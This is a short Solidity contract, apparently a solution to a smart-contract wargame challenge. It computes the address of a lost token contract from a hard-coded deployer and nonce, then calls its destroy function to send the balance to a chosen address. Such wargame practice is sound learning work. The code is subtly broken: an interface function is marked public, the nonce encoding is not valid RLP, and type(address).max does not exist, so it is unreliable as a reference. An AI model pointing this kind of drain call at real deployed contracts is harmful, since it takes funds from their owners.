pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) public;
}


contract RecoveryAttack1 {
    function getSimpleAddress(address recovery, uint256 nonce) public pure returns (address) {
        bytes memory senderRLP = abi.encodePacked(0x94, recovery);
        bytes memory nonceRLP = abi.encode(nonce == 0 ? hex"80" : nonce);
        bytes32 hash = keccak256(abi.encodePacked(0xdb, senderRLP, nonceRLP));
        return address(uint160(uint256(hash) & type(address).max));
    }

    function destroyToken(address payable to) public {
        address simpleTokenAddress = getSimpleAddress(0xa16E02E87b7454126E5E10d957A927A7F5B5d2be, 1);
        ISimpleToken(simpleTokenAddress).destroy(to);
    }
}